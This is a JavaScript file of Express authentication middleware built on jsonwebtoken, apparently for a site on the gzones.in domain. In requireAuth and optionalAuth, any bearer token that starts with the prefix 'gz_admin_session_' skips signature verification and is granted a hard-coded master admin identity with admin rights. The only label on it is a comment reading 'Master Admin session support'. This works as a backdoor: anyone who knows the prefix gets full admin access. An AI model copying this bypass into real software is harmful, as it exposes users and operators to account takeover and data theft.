import jwt from "jsonwebtoken";

export function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ message: "No token provided." });
  }
  const token = authHeader.split(" ")[1];
  
  // Master Admin session support
  if (token && token.startsWith("gz_admin_session_")) {
    req.user = { id: "admin-master-root", email: "admin@gzones.in", isAdmin: true };
    return next();
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    return res.status(401).json({ message: "Invalid or expired token." });
  }
}

export function requireAdmin(req, res, next) {
  requireAuth(req, res, () => {
    if (!req.user || !req.user.isAdmin) {
      return res.status(403).json({ message: "Admin access required." });
    }
    next();
  });
}

// Optional Auth: extracts user if token is valid, but allows guest access
export function optionalAuth(req, _res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return next();
  }
  const token = authHeader.split(" ")[1];

  if (token && token.startsWith("gz_admin_session_")) {
    req.user = { id: "admin-master-root", email: "admin@gzones.in", isAdmin: true };
    return next();
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
  } catch {
    // Non-blocking: continue without authenticated user
  }
  next();
}
